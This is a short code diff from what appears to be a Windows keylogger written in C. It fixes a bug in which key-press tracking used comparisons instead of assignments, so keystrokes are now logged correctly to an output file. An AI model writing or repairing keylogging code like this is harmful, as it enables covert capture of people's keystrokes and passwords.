@@ -56,11 +56,11 @@ int Save(int _key, char *file){
             if (!(keyState) && (pressedChars[i] == 1)){
                 fprintf(OUTPUT_FILE, "%s", &i);
                 //fprintf(OUTPUT_FILE, "RELEASED:%s,%d\n", &i,i);
-                pressedChars[i] == 0;
+                pressedChars[i] = 0;
             }
             if ((keyState & 0x8000) && (pressedChars[i] == 0)){
                 //fprintf(OUTPUT_FILE, "PRESSED:%s,%d\n", &i,i);
-                pressedChars[i] == 1;
+                pressedChars[i] = 1;
             }
         }
     }
